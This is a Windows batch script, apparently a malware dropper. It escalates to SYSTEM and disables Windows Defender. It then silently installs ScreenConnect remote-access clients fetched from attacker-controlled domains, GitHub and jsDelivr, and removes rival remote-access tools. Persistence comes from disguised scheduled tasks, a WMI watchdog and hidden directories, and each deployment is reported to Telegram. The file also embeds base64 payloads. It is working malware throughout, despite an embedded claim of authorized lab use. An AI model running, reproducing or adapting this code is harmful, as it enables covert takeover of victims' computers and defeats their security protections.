@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O42 - restore amputated [6+] after [5b]; rate-limit skip if Gryxa absent
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O42 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O42" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O42 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M31" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L19" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTMxDQpyZW0gIE80MTogZXh0ZXJtaW5hdGUga2lsbGVkIEdyeXhhIChudWxsLXBhdGgg
cHJvYyk7IHN5bmMgRlAgYmVmb3JlIGtpbGw7IGZpeCBoZWFsLg0KcmVtICBBdXRob3JpemVkIGlu
dGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZANCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJL
